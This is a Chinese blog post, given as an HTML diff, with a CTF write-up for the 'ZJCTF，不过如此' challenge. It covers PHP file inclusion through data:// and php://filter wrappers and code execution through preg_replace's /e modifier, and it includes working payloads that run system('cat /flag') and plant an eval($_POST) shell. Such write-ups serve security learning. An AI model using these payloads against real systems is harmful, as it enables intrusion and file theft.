@@ -1,0 +1,479 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>BJDCTF2020 ZJCTF，不过如此 - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="0x00 知识点file_get_contents:f...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">BJDCTF2020 ZJCTF，不过如此</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/cover/nine.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">BJDCTF2020 ZJCTF，不过如此</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 06, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3241</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p>
+<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">path</td>
+<td align="left">必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+<tr>
+<td align="left">start</td>
+<td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
+</tr>
+<tr>
+<td align="left">max_length</td>
+<td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td>
+</tr>
+</tbody></table>
+<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-keyword">is</span> a test <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> test <span class="hljs-built_in">text</span>.<br></code></pre></td></tr></table></figure>
+
+<h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p>
+<p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
+<h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p>
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//include.php</span><br><span class="hljs-meta">&lt;?php</span><br>    @$file  = $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    @<span class="hljs-keyword">include</span>($file);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>无法使用</strong></p>
+<p>payload2：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure>
+
+<p><strong>无法使用</strong></p>
+<p>payload3：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs/</span>Pg==*<br></code></pre></td></tr></table></figure>
+
+<p><strong>可以使用</strong></p>
+<p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p>
+<p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p>
+<p>2.添加空格改变base64编码。</p>
+<p>3.将+号换成%2b</p>
+<p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/20200610150733928.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="在这里插入图片描述"></p>
+<h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p>
+<p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
+<p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
+<p>构造：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>recource=index.php<br></code></pre></td></tr></table></figure>
+
+<p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p>
+<p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p>
+<p><strong>总之呢，php://filter协议有一下几个应用：</strong></p>
+<p>1、利用base64获得源码</p>
+<p>2、通过读写编码实行绕过操作</p>
+<p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p>
+<p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p>
+<p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p>
+<h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
+<h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806084045764.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806084045764"></p>
+<p>代码内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php</span><br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>传两个参数，text和file，之间用&amp;连接即可</p>
+<p>目的是获得下列提示的    next.php</p>
+<p>要满足传入的文件内容为：I have a dream</p>
+<p>使用php伪协议中的data:协议和php的filter:协议</p>
+<p>构造：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,I have a dream&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806083956451.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806083956451"></p>
+<p>解码后代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>$id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br>$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params">$re, $str</span>) </span>&#123;<br><br>  <span class="hljs-keyword">return</span> preg_replace(<br><br>​    <span class="hljs-string">&#x27;/(&#x27;</span> . $re . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br><br>​    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br><br>​    $str<br><br>  );<br><br>&#125;<br><br><span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;<br><br>  <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>  @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现 preg_replace（）函数是一个代码执行的问题</p>
+<p>发现这是用固定解题格式： <strong>\S*=${}</strong></p>
+<p><strong>payload1</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806091905315.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806091905315"></p>
+<p><strong>payload2</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">next</span>.php?\S*=$&#123;<span class="hljs-built_in">eval</span>($_POST[cmd])&#125;<br></code></pre></td></tr></table></figure>
+
+<p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p>
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806092259983.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806092259983"></p>
+<p>上传成功：</p>
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806092509267.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806092509267"></p>
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806092557240.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806092557240"></p>
+<p>或者</p>
+<p><img   class="lazyload" data-original="/2021/08/06/2021/ctf/8/image-20210806092640868.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210806092640868"></p>
+<p>借鉴博客：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/08/06/2021/ctf/8/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;06&#x2F;2021&#x2F;ctf&#x2F;8&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;06&#x2F;2021&#x2F;ctf&#x2F;8&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/08/07/2021/ctf/9/"><i class="iconfont iconleft"></i>BJDCTF2020 Mark loves cat</a>
+    <a href="/2021/08/03/2021/ctf/7/">GWCTF 2019 我有一个数据库&BJDCTF2020 The mystery of ip<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">0x00 知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-text">file_get_contents:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">例子：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#text-plain"><span class="toc-text">text&#x2F;plain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84data-%E5%8D%8F%E8%AE%AE"><span class="toc-text">PHP伪协议中的data:&#x2F;&#x2F;协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter%E5%8D%8F%E8%AE%AE"><span class="toc-text">php:&#x2F;&#x2F;filter协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-replace%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0"><span class="toc-text">preg_replace（）函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E8%A7%A3%E9%A2%98"><span class="toc-text">0x01 解题</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
